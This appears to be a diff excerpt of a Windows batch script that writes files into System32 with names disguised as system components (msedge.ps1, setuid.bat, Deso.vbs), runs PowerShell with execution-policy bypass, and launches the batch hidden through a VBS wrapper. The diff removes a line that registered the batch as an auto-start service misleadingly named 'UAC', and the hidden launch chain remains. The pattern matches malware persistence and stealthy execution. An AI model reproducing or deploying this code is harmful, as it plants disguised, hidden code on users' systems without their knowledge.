@@ -21,5 +21,4 @@ echo } >>%PS1File%
 echo powershell -ExecutionPolicy Bypass C:\Windows\System32\msedge.ps1 >>C:\Windows\System32\setuid.bat
 echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Deso.vbs
 echo WshShell.Run "C:\Windows\System32\setuid.bat", 0 , false >>C:\Windows\System32\Deso.vbs
-sc create "GID" start= auto displayname= "UAC" binpath=C:\Windows\System32\setuid.bat
 start C:\Windows\System32\Deso.vbs
